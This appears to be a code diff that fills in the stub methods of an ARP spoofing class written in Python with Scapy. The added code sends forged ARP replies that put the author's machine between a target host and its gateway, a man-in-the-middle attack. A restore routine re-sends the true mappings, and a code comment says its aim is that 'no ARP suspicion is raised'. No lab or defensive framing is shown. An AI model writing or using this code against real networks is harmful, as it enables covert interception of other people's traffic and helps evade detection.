@@ -77,10 +77,18 @@ class ArpSpoofer:
 
     # One round of forged replies: tells each side the other lives at our MAC.
     def poison(self):
-        return
+        self.send(dst_mac=self.target_mac, spoofed_ip=self.gateway_ip, real_dst_ip=self.target_ip)
+        self.send(dst_mac=self.gateway_mac, spoofed_ip=self.target_ip, real_dst_ip=self.gateway_ip)
 
+    # Builds and sends a single forged/corrective ARP reply. src_mac defaults to
+    # our own MAC (spoofing); restore() overrides it with the real owner's MAC.
     def send(self, dst_mac: str, spoofed_ip: str, real_dst_ip: str, src_mac: str | None = None):
-        return "stub"
+        arp = ARP(op=2, psrc=spoofed_ip, hwsrc=src_mac or self._own_mac, pdst=real_dst_ip, hwdst=dst_mac)
+        pkt = Ether(dst=dst_mac) / arp
+        try:
+            sendp(pkt, iface=self.interface, verbose=False)
+        except Exception as exc:
+            raise SpoofSendError(f"Failed to send ARP packet to {dst_mac!r}: {exc}") from exc
 
     def stop(self):
         self._stop_event.set()
@@ -90,8 +98,21 @@ class ArpSpoofer:
 
     # This should restore the communication between two original targets before shutting down, so no ARP suspicion is raised
     def restore(self):
-        return "bruh"
+        if not (self.target_mac and self.gateway_mac):
+            return  # never finished resolving both sides - nothing was poisoned yet
+        try:
+            for _ in range(3):
+                self.send(dst_mac=self.target_mac, spoofed_ip=self.gateway_ip, real_dst_ip=self.target_ip, src_mac=self.gateway_mac)
+                self.send(dst_mac=self.gateway_mac, spoofed_ip=self.target_ip, real_dst_ip=self.gateway_ip, src_mac=self.target_mac)
+        except SpoofSendError as exc:
+            self.handle_error(exc)
 
     # Records/reports an error raised inside the spoofer thread instead of letting it vanish
     def handle_error(self, error: Exception):
-       return "yeah"
+        self._error = error
+        logger.exception("ARP spoofer on %r stopped due to an error", self.interface, exc_info=error)
+        if self.on_error:
+            try:
+                self.on_error(error)
+            except Exception:
+                logger.exception("on_error handler raised while reporting an ARP-spoof error")
